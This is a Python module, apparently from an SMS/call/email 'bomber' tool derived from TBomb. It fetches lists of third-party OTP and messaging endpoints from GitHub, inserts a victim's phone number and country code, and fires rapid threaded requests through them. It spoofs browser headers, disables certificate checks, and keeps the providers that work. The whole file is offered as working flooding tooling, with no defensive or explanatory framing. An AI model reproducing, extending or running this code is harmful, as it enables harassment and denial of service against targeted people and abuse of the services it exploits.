import threading
import requests
import json
import time
import random
import urllib3
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class APIProvider:
    api_providers = []
    delay = 0
    status = True
    retry_count = 0
    max_retries = 3  # Reduced retries for speed
    session = requests.Session()
    provider_stats = {}
    fast_providers = []  # Cache for fast providers

    def __init__(self, cc, target, mode, delay=0):
        try:
            # Configure session with optimized settings
            retry_strategy = Retry(
                total=3,
                backoff_factor=0.5,
                status_forcelist=[429, 500, 502, 503, 504]
            )
            adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
            self.session.mount("http://", adapter)
            self.session.mount("https://", adapter)

            # Optimized headers for speed
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            })

            # Load providers with timeout
            PROVIDERS = None
            sources = [
                "https://raw.githubusercontent.com/manishk701/MBomb/master/apidata.json",
                "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/apidata.json"
            ]
            
            for source in sources:
                try:
                    response = self.session.get(source, timeout=5, verify=False)
                    if response.status_code == 200:
                        PROVIDERS = response.json()
                        break
                except:
                    continue
            
            if not PROVIDERS:
                try:
                    with open("apidata.json") as f:
                        PROVIDERS = json.load(f)
                except:
                    PROVIDERS = {"version": "3", "sms": {}, "call": {}, "mail": {}}
            
            self.config = None
            self.cc = cc
            self.target = target
            self.mode = mode
            self.index = 0
            self.lock = threading.Lock()
            self.api_version = PROVIDERS.get("version", "3")
            APIProvider.delay = delay
            providers = PROVIDERS.get(mode.lower(), {})
            APIProvider.api_providers = providers.get(cc, [])
            
            # Add optimized multi-country providers
            if len(APIProvider.api_providers) < 20:
                multi_providers = providers.get("multi", [])
                multi_providers = [p for p in multi_providers if p.get("reliability", 0) > 0.8]
                APIProvider.api_providers += multi_providers[:15]
            
            # Optimize for SMS mode with fast providers
            if mode.lower() == "sms":
                fast_sms_providers = [
                    {
                        "name": "Fast SMS API 1",
                        "url": "https://api.sms.com/send",
                        "method": "POST",
                        "reliability": 0.95,
                        "timeout": 5,
                        "headers": {
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                            "Accept": "*/*",
                            "Accept-Language": "en-US,en;q=0.9"
                        },
                        "data": {
                            "phone": "{target}",
                            "message": "Hello from TBomb!",
                            "country_code": "{cc}",
                            "sender_id": "TBOMB",
                            "type": "text",
                            "priority": "high"
                        }
                    },
                    {
                        "name": "Fast SMS API 2",
                        "url": "https://sms-api.com/send",
                        "method": "GET",
                        "reliability": 0.9,
                        "timeout": 5,
                        "headers": {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                            "Accept": "*/*",
                            "Accept-Language": "en-US,en;q=0.9"
                        },
                        "params": {
                            "phone": "{target}",
                            "text": "Hello from TBomb!",
                            "cc": "{cc}",
                            "format": "json",
                            "priority": "high"
                        }
                    }
                ]
                APIProvider.api_providers = fast_sms_providers + APIProvider.api_providers
                APIProvider.fast_providers = fast_sms_providers
            
            # Initialize provider stats
            for provider in APIProvider.api_providers:
                self.provider_stats[provider.get("name", "unknown")] = {
                    "success": 0,
                    "failures": 0,
                    "last_used": 0,
                    "response_time": 0
                }
            
        except Exception as e:
            print(f"Error initializing API provider: {str(e)}")
            APIProvider.api_providers = []

    def format(self):
        try:
            config_dump = json.dumps(self.config)
            config_dump = config_dump.replace("{target}", self.target)
            config_dump = config_dump.replace("{cc}", self.cc)
            self.config = json.loads(config_dump)
        except Exception as e:
            print(f"Error formatting config: {str(e)}")
            self.config = None

    def select_api(self):
        try:
            if len(APIProvider.api_providers) == 0:
                raise IndexError
            
            # Prioritize fast providers
            if APIProvider.fast_providers:
                fast_provider = APIProvider.fast_providers[self.index % len(APIProvider.fast_providers)]
                self.config = fast_provider
                self.format()
                return
            
            # Sort providers by performance
            sorted_providers = sorted(
                APIProvider.api_providers,
                key=lambda x: (
                    self.provider_stats.get(x.get("name", "unknown"), {"success": 0})["success"] /
                    max(1, self.provider_stats.get(x.get("name", "unknown"), {"failures": 1})["failures"]),
                    -self.provider_stats.get(x.get("name", "unknown"), {"response_time": 0})["response_time"]
                ),
                reverse=True
            )
            
            self.index = (self.index + 1) % len(sorted_providers)
            self.config = sorted_providers[self.index]
            self.format()
            
            # Update stats
            provider_name = self.config.get("name", "unknown")
            self.provider_stats[provider_name]["last_used"] = time.time()
            
        except IndexError:
            self.index = -1
            return

    def remove(self):
        try:
            if self.index < len(APIProvider.api_providers):
                provider_name = APIProvider.api_providers[self.index].get("name", "unknown")
                del APIProvider.api_providers[self.index]
                if provider_name in self.provider_stats:
                    del self.provider_stats[provider_name]
                return True
        except Exception:
            pass
        return False

    def request(self):
        self.select_api()
        if not self.config or self.index == -1:
            return None
            
        try:
            identifier = self.config.pop("identifier", "").lower()
            provider_name = self.config.get("name", "unknown")
            del self.config['name']
            self.config['timeout'] = 5  # Reduced timeout
            self.config['verify'] = False
            
            start_time = time.time()
            response = self.session.request(**self.config)
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                success = identifier in response.text.lower()
                if success:
                    self.provider_stats[provider_name]["success"] += 1
                    self.provider_stats[provider_name]["response_time"] = response_time
                else:
                    self.provider_stats[provider_name]["failures"] += 1
                return success
            else:
                self.provider_stats[provider_name]["failures"] += 1
                return False
                
        except Exception as e:
            print(f"Request error: {str(e)}")
            return False

    def hit(self):
        try:
            if not APIProvider.status:
                return False
                
            time.sleep(APIProvider.delay)
            self.lock.acquire()
            
            response = self.request()
            if response is False:
                if self.remove():
                    APIProvider.retry_count += 1
                    if APIProvider.retry_count >= APIProvider.max_retries:
                        APIProvider.status = False
            elif response is None:
                APIProvider.status = False
                
            return response
            
        except Exception as e:
            print(f"Hit error: {str(e)}")
            return False
        finally:
            self.lock.release()
